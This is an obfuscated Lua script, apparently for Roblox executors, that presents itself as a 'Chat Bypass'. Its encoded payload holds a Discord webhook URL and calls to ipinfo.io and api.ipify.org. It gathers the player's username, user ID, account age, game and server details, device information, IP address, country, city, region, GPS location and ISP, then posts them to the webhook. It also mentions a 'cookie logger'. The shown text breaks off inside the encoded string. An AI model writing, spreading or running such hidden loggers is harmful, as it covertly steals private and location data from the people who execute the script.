
local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v79=0;local v80;while true do if (v79==0) then v80=v2(v0(v30,16));if v19 then local v103=v5(v80,v19);v19=nil;return v103;else return v80;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v81=(v31/((5 -(1 + 2))^(v32-(2 -1))))%(2^(((v33-1) -(v32-(1 -(0 + 0)))) + (2 -1))) ;return v81-(v81%(620 -((1432 -(282 + 595)) + 64))) ;else local v82=(933 -(857 + 74))^(v32-1) ;return (((v31%(v82 + v82))>=v82) and ((2206 -(1523 + 114)) -(367 + 201))) or (927 -(214 + 713)) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=0 + 0 + 0 ;local v36;local v37;while true do if (v35==(0 -(0 + 0))) then v36,v37=v1(v16,v18,v18 + (1067 -(68 + (1954 -(892 + 65)))) );v18=v18 + (1272 -(226 + 1044)) ;v35=4 -3 ;end if (v35==(118 -(32 + 85))) then return (v37 * 256) + v36 ;end end end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + (7 -4) );v18=v18 + 4 ;return (v41 * (31011612 -14234396)) + (v40 * (120312 -54776)) + (v39 * 256) + v38 ;end local function v24() local v42=v23();local v43=v23();local v44=351 -(87 + (1054 -(368 + 423))) ;local v45=(v20(v43,1,200 -(67 + (354 -241)) ) * ((2 + (18 -(10 + 8)))^((299 -221) -46))) + v42 ;local v46=v20(v43,(458 -(416 + 26)) + 5 + 0 ,123 -92 );local v47=((v20(v43,102 -70 )==(953 -(802 + 150))) and  -(2 -1)) or (1 -0) ;if (v46==(0 + 0)) then if (v45==(997 -(915 + 82))) then return v47 * (0 -0) ;else v46=1;v44=0 + 0 ;end elseif (v46==(2691 -644)) then return ((v45==0) and (v47 * ((1188 -(1069 + 118))/(0 -0)))) or (v47 * NaN) ;end return v8(v47,v46-(2237 -(521 + 693)) ) * (v44 + (v45/((1 + 1)^(92 -40)))) ;end local function v25(v48) local v49=0 -(0 + 0) ;local v50;local v51;while true do if (v49==(441 -(145 + 293))) then return v6(v51);end if (v49==(431 -(44 + (1409 -1023)))) then v50=v3(v16,v18,(v18 + v48) -1 );v18=v18 + v48 ;v49=1488 -((3543 -2545) + 488) ;end if (v49==(1 + 1)) then v51={};for v89=1 + 0 , #v50 do v51[v89]=v2(v1(v3(v50,v89,v89)));end v49=(1634 -(814 + 45)) -(201 + 571) ;end if (v49==(1138 -(116 + 1022))) then v50=nil;if  not v48 then v48=v23();if (v48==0) then return "";end end v49=4 -3 ;end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return 0 -0 ;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();while true do if ((287 -(134 + 151))~=v52) then else for v91= #"[",v23() do local v92=(function() return v21();end)();if (v20(v92, #"!", #"[")==(1665 -(970 + 695))) then local v99=(function() return 0 -0 ;end)();local v100=(function() return;end)();local v101=(function() return;end)();local v102=(function() return;end)();while true do if (v99==(1002 -(241 + 761))) then local v104=(function() return 0 + 0 ;end)();local v105=(function() return;end)();while true do if ((0 -0)~=v104) then else v105=(function() return 0 -0 ;end)();while true do if (v105==1) then v99=(function() return 1 + 0 ;end)();break;end if (v105==0) then v100=(function() return v20(v92,6 -4 , #"91(");end)();v101=(function() return v20(v92, #"?id=",6);end)();v105=(function() return 1;end)();end end break;end end end if (v99~=1) then else local v106=(function() return 0 -0 ;end)();while true do if (v106~=(241 -(187 + 54))) then else v102=(function() return {v22(),v22(),nil,nil};end)();if (v100==0) then local v117=(function() return 0 -0 ;end)();local v118=(function() return;end)();while true do if ((698 -(208 + 490))==v117) then v118=(function() return 0;end)();while true do if (v118~=0) then else v102[ #"asd"]=(function() return v22();end)();v102[ #"?id="]=(function() return v22();end)();break;end end break;end end elseif (v100== #"~") then v102[ #"-19"]=(function() return v23();end)();elseif (v100==(2 + 0)) then v102[ #"asd"]=(function() return v23() -(2^(2 + 14)) ;end)();elseif (v100== #"gha") then local v321=(function() return 0 + 0 ;end)();while true do if (v321==0) then v102[ #"asd"]=(function() return v23() -(2^(26 -10)) ;end)();v102[ #".dev"]=(function() return v22();end)();break;end end end v106=(function() return 1;end)();end if (v106~=1) then else v99=(function() return 2;end)();break;end end end if (v99==(838 -(660 + 176))) then if (v20(v101, #">", #"|")== #"~") then v102[1 + 1 ]=(function() return v58[v102[2]];end)();end if (v20(v101,1638 -(1373 + 263) ,1002 -(451 + 549) )== #"[") then v102[ #"xxx"]=(function() return v58[v102[ #"91("]];end)();end v99=(function() return 205 -(14 + 188) ;end)();end if ((678 -(534 + 141))~=v99) then else if (v20(v101, #"19(", #"xxx")~= #">") then else v102[ #"0313"]=(function() return v58[v102[ #"0836"]];end)();end v53[v91]=(function() return v102;end)();break;end end end end for v93= #"{",v23() do v54[v93-#"}" ]=(function() return v28();end)();end return v56;end if ( #","==v52) then local v86=(function() return 0 -0 ;end)();local v87=(function() return;end)();while true do if (v86==(0 + 0)) then v87=(function() return 0;end)();while true do if ((1 + 0)~=v87) then else for v109= #"\\",v57 do local v110=(function() return 1384 -(746 + 638) ;end)();local v111=(function() return;end)();local v112=(function() return;end)();local v113=(function() return;end)();while true do if (v110==(1 + 0)) then v113=(function() return nil;end)();while true do if (v111==(0 -0)) then v112=(function() return v21();end)();v113=(function() return nil;end)();v111=(function() return 1 -0 ;end)();end if (v111==(2 -1)) then if (v112== #"{") then v113=(function() return v21()~=(0 + 0) ;end)();elseif (v112==(2 + 0)) then v113=(function() return v24();end)();elseif (v112== #"19(") then v113=(function() return v25();end)();end v58[v109]=(function() return v113;end)();break;end end break;end if (v110==(396 -(115 + 281))) then v111=(function() return 0 -0 ;end)();v112=(function() return nil;end)();v110=(function() return 1 + 0 ;end)();end end end v56[ #"xxx"]=(function() return v21();end)();v87=(function() return 4 -2 ;end)();end if (v87==(2 + 0)) then v52=(function() return 7 -5 ;end)();break;end if (v87==(560 -(306 + 254))) then v57=(function() return v23();end)();v58=(function() return {};end)();v87=(function() return 868 -(550 + 317) ;end)();end end break;end end end if (v52~=0) then else local v88=(function() return 0;end)();while true do if (v88~=1) then else v55=(function() return {};end)();v56=(function() return {v53,v54,nil,v55};end)();v88=(function() return 1469 -(899 + 568) ;end)();end if (v88~=(2 + 0)) then else v52=(function() return  #",";end)();break;end if (v88==(0 -0)) then v53=(function() return {};end)();v54=(function() return {};end)();v88=(function() return 1 -0 ;end)();end end end end end local function v29(v59,v60,v61) local v62=v59[(2 + 0) -(1 + 0) ];local v63=v59[605 -(117 + 151 + 335) ];local v64=v59[293 -(60 + 230) ];return function(...) local v65=v62;local v66=v63;local v67=v64;local v68=v27;local v69=573 -(426 + 146) ;local v70= -(1 + 0);local v71={};local v72={...};local v73=v12("#",...) -(2 -1) ;local v74={};local v75={};for v83=811 -(569 + 242) ,v73 do if (v83>=v67) then v71[v83-v67 ]=v72[v83 + (2 -1) ];else v75[v83]=v72[v83 + 1 + 0 ];end end local v76=(v73-v67) + (1025 -(706 + 318)) ;local v77;local v78;while true do v77=v65[v69];v78=v77[1252 -(721 + 530) ];if (v78<=33) then if (v78<=(1287 -(945 + 326))) then if ((v78<=(16 -9)) or (2591==3409) or (4048>4232)) then if (v78<=(3 + 0)) then if ((v78<=(701 -(271 + 429))) or (1750>=3473)) then if ((3166==3166) and (v78==0)) then local v119=v77[2 + 0 ];v75[v119]=v75[v119](v13(v75,v119 + (1501 -(1408 + 92)) ,v70));else local v121=1086 -(461 + 625) ;local v122;while true do if (v121==(0 + 0)) then v122=v77[1290 -(993 + 295) ];v75[v122](v75[v122 + 1 + 0 ]);break;end end end elseif (v78>(1173 -(418 + 753))) then local v123=0;local v124;while true do if (v123==(0 + 0)) then v124=v77[1 + 1 ];v75[v124]=v75[v124](v13(v75,v124 + 1 + 0 ,v77[3]));break;end end elseif ((1763<3724) and (v75[v77[1 + 1 ]]==v75[v77[533 -(406 + 123) ]])) then v69=v69 + (1770 -(1749 + (1187 -(645 + 522)))) ;else v69=v77[1 + 2 ];end elseif ((57<=2723) and (4514>3324) and (v78<=((3117 -(1010 + 780)) -(1249 + 73 + 0)))) then if ((v78==(19 -15)) or (208>=4828) or (2070==443)) then local v125=v77[1 + 1 ];local v126=v75[v77[1148 -(466 + 679) ]];v75[v125 + ((5 -3) -1) ]=v126;v75[v125]=v126[v77[11 -(1843 -(1045 + 791)) ]];else local v130=(4809 -2909) -(106 + 1794) ;local v131;while true do if ((v130==(0 + (0 -0))) or (2705==1393)) then v131=v77[1 + 1 ];v75[v131]=v75[v131](v75[v131 + (2 -1) ]);break;end end end elseif (v78>(16 -10)) then local v132=0;local v133;while true do if (v132==(114 -((509 -(351 + 154)) + 110))) then v133=v77[586 -((1631 -(1281 + 293)) + 527) ];v75[v133]=v75[v133](v75[v133 + (1428 -(41 + 1386)) ]);break;end end else v75[v77[105 -(17 + 86) ]]=v75[v77[3 + 0 ]][v77[8 -4 ]];end elseif ((v78<=(31 -20)) or (1583>3567) or (4601<61)) then if (v78<=9) then if (v78>8) then v75[v77[2]]=v75[v77[3]] * v77[170 -((388 -(28 + 238)) + 44) ] ;elseif  not v75[v77[2 -0 ]] then v69=v69 + (3 -2) ;else v69=v77[3 + 0 ];end elseif ((v78==(22 -12)) or (1313==794)) then v75[v77[1 + 1 ]][v77[5 -2 ]]=v75[v77[69 -(30 + 35) ]];else v75[v77[2 + 0 ]][v77[1260 -(1043 + 214) ]]=v77[15 -11 ];end elseif (v78<=(1225 -(323 + 889))) then if (v78>((1590 -(1381 + 178)) -19)) then v75[v77[582 -(361 + 219) ]]= #v75[v77[323 -(53 + 267) ]];else v75[v77[1 + 1 + 0 ]]=v60[v77[(336 + 80) -(15 + 398) ]];end elseif ((3174>2902) and (v78<=(996 -(8 + 10 + 964)))) then v75[v77[7 -5 ]]= #v75[v77[2 + 1 ]];elseif (v78==(10 + 5)) then local v261=850 -(20 + 830) ;local v262;local v263;while true do if ((v261==(1 + 0)) or (1390>=4744)) then for v322=127 -(116 + 10) , #v74 do local v323=v74[v322];for v329=0 + 0 , #v323 do local v330=v323[v329];local v331=v330[1];local v332=v330[740 -(542 + 196) ];if ((v331==v75) and (v332>=v262)) then v263[v332]=v331[v332];v330[1 -0 ]=v263;end end end break;end if (v261==(0 + 0)) then v262=v77[2 + 0 ];v263={};v261=1 + (0 -0) ;end end else local v264=0;local v265;local v266;local v267;local v268;while true do if ((v264==0) or (2003>3834)) then v265=v77[4 -(2 + 0) ];v266,v267=v68(v75[v265](v13(v75,v265 + 1 ,v77[7 -4 ])));v264=1552 -(1126 + 425) ;end if (v264==(406 -(118 + 287))) then v70=(v267 + v265) -(3 -2) ;v268=1121 -(118 + 1003) ;v264=5 -3 ;end if (v264==(379 -(142 + 235))) then for v324=v265,v70 do v268=v268 + 1 ;v75[v324]=v266[v268];end break;end end end elseif ((4120<=4260) and (v78<=24)) then if ((v78<=20) or (156>3913)) then if (v78<=18) then if ((195==195) and (v78>17)) then local v145=v77[9 -(477 -(381 + 89)) ];v75[v145](v75[v145 + 1 + 0 ]);else do return;end end elseif ((3105>=1796) and (v78>(996 -(553 + 424)))) then for v216=v77[2],v77[3] do v75[v216]=nil;end else do return;end end elseif ((4379>=2131) and (v78<=(41 -19))) then if ((3844>=2043) and (v78>(19 + 2))) then local v146=v77[2 + 0 + 0 ];local v147,v148=v68(v75[v146](v13(v75,v146 + 1 + 0 ,v77[2 + 0 + 1 ])));v70=(v148 + v146) -(1 + 0) ;local v149=0 -0 ;for v218=v146,v70 do v149=v149 + (2 -1) ;v75[v218]=v147[v149];end else local v150=v77[2];local v151=v75[v150];local v152=v77[6 -(4 -1) ];for v221=1 + 0 ,v152 do v151[v221]=v75[v150 + v221 ];end end elseif (v78>23) then local v153=v77[9 -7 ];v75[v153]=v75[v153](v13(v75,v153 + (754 -(239 + 514)) ,v77[2 + 1 ]));else local v155=v77[3];local v156=v75[v155];for v224=v155 + (1330 -(797 + 532)) ,v77[3 + 1 ] do v156=v156   .. v75[v224] ;end v75[v77[2]]=v156;end elseif ((v78<=(10 + (1174 -(1074 + 82)))) or (883>4778) or (3232<=2731)) then if (v78<=(60 -34)) then if (v78==(1227 -((817 -444) + 829))) then v75[v77[733 -(476 + (2039 -(214 + 1570))) ]]={};else local v159=v77[1132 -(369 + 761) ];v75[v159]=v75[v159]();end elseif ((4905==4905) and ((v78>((1471 -(990 + 465)) + 11)) or (3620>=4891))) then local v161=0 -0 ;local v162;while true do if (v161==(0 -0)) then v162=v77[2];v75[v162](v13(v75,v162 + ((99 + 140) -(64 + 174)) ,v77[1 + 2 ]));break;end end else v75[v77[2]]=v77[3 -0 ];end elseif ((v78<=(366 -(144 + 192))) or (4136>=4411)) then if ((v78>(245 -(19 + 23 + 170 + 4))) or (2958==4017)) then v69=v77[11 -8 ];elseif ((1228>=813) and (v75[v77[2]]==v75[v77[4 + 0 ]])) then v69=v69 + 1 + 0 ;else v69=v77[2 + 1 ];end elseif (((4258>937) and (v78<=(1535 -(363 + 1141)))) or (3455>4050)) then v75[v77[1582 -(1183 + 397) ]]=v75[v77[3]];elseif ((243==243) and (v78==(97 -65))) then v75[v77[2 + 0 ]][v77[3 + 0 ]]=v77[1979 -(1913 + 62) ];else local v272=v77[2 + 0 ];v75[v272](v13(v75,v272 + (2 -1) ,v77[1936 -(565 + 1368) ]));end elseif (v78<=((1914 -(1668 + 58)) -138)) then if ((v78<=(1702 -(1477 + 184))) or (271>1572)) then if (v78<=(50 -13)) then if ((2739<3293) and ((v78<=(33 + 2)) or (4869<906))) then if (v78>(890 -(564 + 292))) then v75[v77[(628 -(512 + 114)) -0 ]]=v61[v77[(20 -12) -5 ]];else local v170=0;local v171;local v172;while true do if (v170==0) then v171=v77[306 -(244 + (124 -64)) ];v172={};v170=1 + 0 ;end if ((v170==(3 -2)) or (1225>4228)) then for v303=477 -(41 + 435) , #v74 do local v304=v74[v303];for v315=1001 -(938 + 30 + 33) , #v304 do local v316=v304[v315];local v317=v316[1 + 0 ];local v318=v316[1127 -(936 + 189) ];if (((3328>2238) and (v317==v75) and (v318>=v171)) or (3942<1134)) then v172[v318]=v317[v318];v316[1 + 0 + 0 ]=v172;end end end break;end end end elseif (v78==(1649 -(1565 + 48))) then local v173=0;local v174;while true do if (v173==(0 + 0)) then v174=v77[1140 -(782 + 356) ];v75[v174]=v75[v174]();break;end end else v75[v77[269 -(154 + 22 + 91) ]]=v75[v77[7 -4 ]][v77[5 -1 ]];end elseif (v78<=(1131 -(975 + 117))) then if ((3839>1405) and (v78==(1913 -(157 + 1718)))) then if v75[v77[2 + 0 ]] then v69=v69 + (3 -2) ;else v69=v77[10 -7 ];end else v75[v77[1020 -(697 + 321) ]]={};end elseif (v78==(108 -68)) then if ( not v75[v77[3 -1 ]] or (1293<=507)) then v69=v69 + (2 -1) ;else v69=v77[3];end else v75[v77[6 -4 ]]=v61[v77[2 + 1 ]];end elseif ((v78<=(84 -39)) or (2896<805)) then if (((2316==2316) and (v78<=(115 -72))) or (2693==4973)) then if (v78==(1269 -((2316 -(109 + 1885)) + 905))) then local v180=v77[613 -(602 + 9) ];local v181=v75[v180];local v182=v77[1192 -(449 + 740) ];for v225=1,v182 do v181[v225]=v75[v180 + v225 ];end else v75[v77[874 -(826 + 46) ]]=v75[v77[1472 -(1269 + 200) ]] * v77[951 -(245 + 702) ] ;end elseif ((2146==2146) and (v78>(138 -(179 -85)))) then local v184=v77[1 + 2 ];local v185=v75[v184];for v228=v184 + 1 ,v77[4] do v185=v185   .. v75[v228] ;end v75[v77[1900 -(260 + 1638) ]]=v185;else local v187=v66[v77[443 -(382 + 58) ]];local v188;local v189={};v188=v10({},{__index=function(v229,v230) local v231=v189[v230];return v231[1][v231[6 -4 ]];end,__newindex=function(v232,v233,v234) local v235=v189[v233];v235[1][v235[2 + 0 ]]=v234;end});for v237=1 -0 ,v77[11 -7 ] do v69=v69 + (1206 -(902 + (1118 -(98 + 717)))) ;local v238=v65[v69];if ((v238[(827 -(802 + 24)) -0 ]==(74 -43)) or (2570==1533)) then v189[v237-(1 + 0) ]={v75,v238[3]};else v189[v237-(215 -(22 + 192)) ]={v60,v238[8 -5 ]};end v74[ #v74 + (1 -0) ]=v189;end v75[v77[767 -(468 + 297) ]]=v29(v187,v188,v61);end elseif (v78<=(609 -(334 + 228))) then if (v78==((267 -112) -109)) then do return v75[v77[4 -2 ]];end elseif (v77[2 -0 ]==v75[v77[4]]) then v69=v69 + 1 + 0 ;else v69=v77[239 -(141 + 95) ];end elseif ((v78<=48) or (883==1460)) then v69=v77[3 + 0 ];elseif (v78>(125 -(95 -19))) then v75[v77[2]]=v75[v77[6 -3 ]] -v75[v77[1 + 3 ]] ;else local v277=v77[2];local v278=v75[v277];for v300=v277 + (2 -1) ,v77[3] do v7(v278,v75[v300]);end end elseif (v78<=(41 + 17)) then if ((v78<=(29 + 25)) or (2244==3224)) then if ((v78<=(72 -20)) or (4619<=999)) then if ((v78==51) or (3410>4116)) then if v75[v77[2]] then v69=v69 + 1 + 0 ;else v69=v77[166 -(92 + 71) ];end else local v192=0 + 0 ;local v193;local v194;local v195;while true do if ((v192==(1 -0)) or (903>=3059)) then v195=765 -(574 + 191) ;for v305=v193,v77[4] do v195=v195 + 1 + 0 + 0 ;v75[v305]=v194[v195];end break;end if (v192==0) then v193=v77[4 -2 ];v194={v75[v193](v75[v193 + 1 ])};v192=1;end end end elseif (v78>(902 -(254 + 595))) then v75[v77[128 -(55 + 71) ]]=v75[v77[3 -(0 + 0) ]] -v75[v77[1794 -(573 + 1217) ]] ;else local v197=v66[v77[1 + 2 ]];local v198;local v199={};v198=v10({},{__index=function(v240,v241) local v242=0;local v243;while true do if ((0 -0)==v242) then v243=v199[v241];return v243[1 + 0 ][v243[2 -0 ]];end end end,__newindex=function(v244,v245,v246) local v247=0;local v248;while true do if ((v247==(939 -(714 + 225))) or (4904<=1916)) then v248=v199[v245];v248[2 -1 ][v248[2 -0 ]]=v246;break;end end end});for v249=1,v77[4] do local v250=0 + 0 ;local v251;while true do if ((0 -0)==v250) then v69=v69 + (807 -(118 + 247 + 441)) ;v251=v65[v69];v250=49 -(25 + 23) ;end if (v250==(1 + 0)) then if ((90<=1065) and (v251[1887 -(378 + 549 + 959) ]==(104 -73))) then v199[v249-((605 + 128) -(12 + 4 + 716)) ]={v75,v251[3]};else v199[v249-(98 -(11 + (1519 -(797 + 636)))) ]={v60,v251[288 -(175 + 110) ]};end v74[ #v74 + 1 ]=v199;break;end end end v75[v77[4 -2 ]]=v29(v197,v198,v61);end elseif ((4802==4802) and (v78<=(276 -220))) then if ((v78>(1851 -(503 + 1293))) or (2280<=511)) then if (v75[v77[9 -7 ]]==v77[11 -7 ]) then v69=v69 + 1 + 0 ;else v69=v77[1064 -(810 + (1870 -(1427 + 192))) ];end elseif ((v75[v77[2 + 0 + 0 ]]==v77[2 + (4 -2) ]) or (3976<2857) or (1676<=463)) then v69=v69 + 1 + 0 ;else v69=v77[536 -(43 + 490) ];end elseif ((3869==3869) and (v78>(790 -(711 + 22)))) then local v201=v77[7 -5 ];do return v13(v75,v201,v201 + v77[(775 + 87) -(240 + 619) ] );end elseif ((1158<=2613) and (v77[1 + 1 ]==v75[v77[5 -1 ]])) then v69=v69 + 1 ;else v69=v77[3];end elseif (v78<=62) then if (v78<=(4 + 56)) then if ((4930>2307) and (v78>(1803 -(1344 + 182 + 218)))) then local v202=v77[2];local v203=v75[v77[3]];v75[v202 + (406 -(255 + 150)) ]=v203;v75[v202]=v203[v77[4 + 0 ]];else v75[v77[2 + 0 ]]=v77[12 -9 ];end elseif ((v78==(196 -135)) or (4046<1291) or (2364<=1999)) then local v209=v77[1741 -(404 + 1335) ];local v210={v75[v209](v75[v209 + (1 -0) ])};local v211=0;for v252=v209,v77[3 + (327 -(192 + 134)) ] do v211=v211 + (1277 -(316 + 960)) + 0 ;v75[v252]=v210[v211];end else local v212=v77[339 -(10 + 327) ];v75[v212]=v75[v212](v13(v75,v212 + 1 + 0 ,v70));end elseif (v78<=(402 -(118 + 220))) then if ((v78==(21 + 42)) or (4241==3545)) then v75[v77[451 -(108 + 341) ]]=v60[v77[3]];else do return v75[v77[1 + 1 ]];end end elseif ((v78<=(274 -209)) or (4922<194)) then for v255=v77[(832 + 663) -(711 + 782) ],v77[5 -2 ] do v75[v255]=nil;end elseif (v78>66) then v75[v77[471 -(270 + 199) ]][v77[1 + 2 ]]=v75[v77[(1407 + 416) -(580 + 1239) ]];else v75[v77[2 + 0 ]]=v75[v77[8 -5 ]];end v69=v69 + 1 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!AA3O0003073O0067657467656E7603083O007768736372697074030B3O004368617420427970612O73030E3O00776562682O6F6B6578656355726C03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313237392O333635302O3730353931373530322F544A49626964706444666C565A4E6377354A4F6F52735148474257424A4F4E667158577A30512O636A432O7663313567794555624C6A4F696E7469704A455676586F5552030D3O00457865634C6F675365637265742O0103063O0067657468756903063O007363722O656E03083O00496E7374616E63652O033O006E657703063O00466F6C64657203043O004E616D6503063O00506172656E7403043O0067616D65030A3O004765745365727669636503073O00506C6179657273030B3O004C6F63616C506C6179657203063O0055736572496403073O00506C616365496403083O00746F737472696E6703053O004A6F62496403123O004D61726B6574706C61636553657276696365030E3O0047657450726F64756374496E666F03103O0055736572496E70757453657276696365030B3O00476574506C6174666F726D03043O00456E756D03083O00506C6174666F726D03073O0057696E646F777303093O00504320EFBFBDEBAEB2030D3O004D6F62696C6520EFBFBDEBB291033B3O0067616D653A47657453657276696365282754656C65706F72745365727669636527293A54656C65706F7274546F506C616365496E7374616E6365282O033O002C2027030A3O00272C20706C617965722903023O006F7303043O006461746503113O0025592D256D2D25642025483A254D3A255303093O00576F726B737061636503043O006D61746803053O00666C2O6F72030D3O0043752O72656E7443616D657261030C3O0056696577706F727453697A6503013O005803013O005903053O00537461747303153O00476574546F74616C4D656D6F727955736167654D62030A3O00476574506C6179657273030A3O004D6178506C617965727303093O00436861726163746572030E3O0046696E6446697273744368696C6403083O0048756D616E6F696403063O004865616C74682O033O004E2F4103093O004D61784865616C746803103O0048756D616E6F6964522O6F745061727403083O00506F736974696F6E030C3O00506C61636556657273696F6E03083O00746F6E756D62657203073O004E6574776F726B030F3O0053657276657253746174734974656D03093O00446174612050696E67030E3O0047657456616C7565537472696E6703053O006D6174636803053O002825642B2903073O00636F6E74656E7403093O004065766572796F6E6503093O00636F6E74656E745F3203063O00656D6265647303053O007469746C65033E3O004D4144452042592044584643207C20EFBFBDEFBFBD202O2A53637269707420457865637574696F6E204465746563746564207C2045786563204C6F672O2A030B3O006465736372697074696F6E03593O002AEFBFBDEFBFBD204F6E65206F66207468652053637269707427732068617320622O656E2045786563757465642E28EFBFBDEB9CA7432O4F4B4945204C4F2O474552204953205041544348454420464F52204E4F5721293A2A03043O007479706503043O007269636803053O00636F6C6F72023O0040C4CF6C4103063O006669656C647303043O006E616D6503163O00EFBFBDEBB587202O2A53637269707420496E666F2O2A03053O0076616C756503173O003O60EFBFBDEBAEB220536372697074204E616D653A2003153O000AEFBFBDEFBFBD2045786563757465642041743A202O033O003O6003063O00696E6C696E65010003193O00EFBFBDEBAB80202O2A506C617965722044657461696C732O2A03143O003O60EFBFBDE38E8F20557365726E616D653A2003163O000AEFBFBDEBB1B720446973706C6179204E616D653A20030B3O00446973706C61794E616D6503103O000AEFBFBDEB2O84205573657249443A2003133O000AEFBFBDE385BFED8898204865616C74683A202O033O00202F20033C3O000AEFBFBDEBB5952050726F66696C653A20566965772050726F66696C652028682O7470733A2O2F3O772E726F626C6F782E636F6D2F75736572732F030C3O002F70726F66696C65293O60031E3O00EFBFBDEBB19F202O2A412O636F756E7420496E666F726D6174696F6E2O2A031D3O003O60EFBFBDEBBF8EE688AAEFBFBD20412O636F756E74204167653A20030A3O00412O636F756E74416765031D3O0020646179730AEFBFBDEBADBF205072656D69756D205374617475733A2003193O000AEFBFBDEBB19F20412O636F756E7420437265617465643A2003083O0025592D256D2D256403043O0074696D65025O0018F54003173O00EFBFBDEBA09C202O2A47616D652044657461696C732O2A031B3O003O60EFBFBDEBA487E688AAEFBFBD2047616D65204E616D653A2003113O000AEFBFBDEB2O842047616D652049443A2003303O000AEFBFBDEBB5952047616D65204C696E6B2028682O7470733A2O2F3O772E726F626C6F782E636F6D2F67616D65732F03173O00290AEFBFBDEBB5A22047616D652056657273696F6E3A20031C3O00EFBFBDEBB998E688AAEFBFBD202O2A53657276657220496E666F2O2A031D3O003O60EFBFBDEBAB8120506C617965727320696E205365727665723A2003153O000AEFBFBDEBB8A9205365727665722054696D653A2003083O0025483A254D3A255303173O00EFBFBDEBB1BB202O2A4E6574776F726B20496E666F2O2A03103O003O60EFBFBDEBB29B2050696E673A2003063O00206D733O60031C3O00EFBFBDEBBCA2E688AAEFBFBD202O2A53797374656D20496E666F2O2A03163O003O60EFBFBDEBB29F205265736F6C7574696F6E3A2003013O007803163O000AEFBFBDEBB587204D656D6F72792055736167653A2003183O00204D420AEFBFBDEC888BED8898204578656375746F723A2003103O006964656E746966796578656375746F7203243O00EFBFBDEBB1A7202O2A43686172616374657220506F736974696F6E205363726970742O2A03573O003O6067616D652E506C61796572732E4C6F63616C506C617965722E4368617261637465722E48756D616E6F6964522O6F74506172742E434672616D65203D20434672616D652E6E657728566563746F72332E6E65772803063O002O293O600A03163O00EFBFBDE38187202O2A4A6F696E205363726970742O2A03073O003O606C75610A03093O007468756D626E61696C2O033O0075726C03B83O00682O7470733A2O2F63646E2E646973636F7264612O702E636F6D2F612O746163686D656E74732F3132373538343631373238363235372O3835332F31323738373935332O3731373633342O3638342F494D475F352O30352E6769663F65783D2O366432316138302669733D2O36643063392O3026686D3D386562336637363839643736376531336433366337656238656434626561643O37323866383734662O6537663035396435656461626635662O636437392O612603063O00662O6F74657203043O0074657874031E3O004D6164652062792064786663207769746820EFBFBDE385BFED8898207C2003083O0069636F6E5F75726C03B83O00682O7470733A2O2F63646E2E646973636F7264612O702E636F6D2F612O746163686D656E74732F3132373538343631373238363235372O3835332F31323738373932382O363439353436333435342F494D475F352O30332E6769663F65783D2O366432313832612669733D2O36643063362O6126686D3D33622O356139652O30353134643230376461393036376530336538613834642O663732656333352O64303662376265396535652O39373461356265386539383026028O00030B3O00482O747053657276696365030A3O004A534F4E4465636F646503073O00482O747047657403123O00682O7470733A2O2F6970696E666F2E696F2F03153O00682O7470733A2O2F6170692E69706966792E6F726703053O002F6A736F6E03053O007461626C6503063O00696E73657274026O00F03F03153O002O2A6028EFBFBDE384BB2920536563726574602O2A03173O002O7C28EFBFBDEBAABF2920495020412O6472652O733A2003023O00697003173O002O7C0A2O7C28EFBFBDEB99802920436F756E7472793A2003073O00636F756E747279031C3O002O7C0A2O7C28EFBFBDECB2922920475053204C6F636174696F6E3A202O033O006C6F63031A3O002O7C0A2O7C28EFBFBDEBA39EE688AAEFBFBD2920436974793A2003043O006369747903163O002O7C0A2O7C28EFBFBDEBA3AA2920526567696F6E3A2003063O00726567696F6E03163O002O7C0A2O7C28EFBFBDE381822920486F737465723A202O033O006F726703023O002O7C030A3O004A534F4E456E636F6465030C3O00636F6E74656E742D7479706503103O00612O706C69636174696F6E2F6A736F6E030C3O00682O74705F7265717565737403073O00726571756573742O033O0073796E03063O00666C7578757303043O00682O74702O033O0055726C03043O00426F647903063O004D6574686F6403043O00504F535403073O00486561646572730097012O0012233O00014O00243O0001000200300B3O000200030012233O00014O00243O0001000200300B3O000400050012233O00014O00243O0001000200300B3O000600070012233O00084O00243O0001000200121B000100093O0012230002000A3O00200600020002000B00121B0003000C4O000700020002000200100A0002000D000100100A0002000E3O0012230003000F3O00200400030003001000121B000500114O00180003000500020020060003000300120012230004000F3O00200400040004001000121B000600114O00180004000600020020060005000300130012230006000F3O002006000600060014001223000700153O0012230008000F3O0020060008000800162O00070007000200020012230008000F3O00200400080008001000121B000A00174O00180008000A0002002004000800080018001223000A000F3O002006000A000A00142O00180008000A000200200600080008000D0012230009000F3O00200400090009001000121B000B00194O00180009000B000200200400090009001A2O0007000900020002001223000A001B3O002006000A000A001C002006000A000A001D000602000900390001000A0004303O0039000100121B0009001E3O0006080009003A000100010004303O003A000100121B0009001F3O00121B000A00204O0042000B00063O00121B000C00214O0042000D00073O00121B000E00224O002D000A000A000E001223000B00233O002006000B000B002400121B000C00254O0007000B00020002001223000C000F3O002004000C000C001000121B000E00264O0018000C000E0002001223000D00273O002006000D000D0028002006000E000C0029002006000E000E002A002006000E000E002B2O0007000D00020002001223000E00273O002006000E000E0028002006000F000C0029002006000F000F002A002006000F000F002C2O0007000E00020002001223000F000F3O002004000F000F001000121B0011002D4O0018000F00110002002004000F000F002E2O0007000F0002000200200400100004002F2O00070010000200022O000E001000103O0020060011000400300020060012000300310006260012006C00013O0004303O006C000100200600120003003100200400120012003200121B001400334O00180012001400020006260012006C00013O0004303O006C00010020060012000300310020060012001200330020060012001200340006080012006D000100010004303O006D000100121B001200353O0020060013000300310006260013007B00013O0004303O007B000100200600130003003100200400130013003200121B001500334O00180013001500020006260013007B00013O0004303O007B00010020060013000300310020060013001300330020060013001300360006080013007C000100010004303O007C000100121B001300353O0020060014000300310006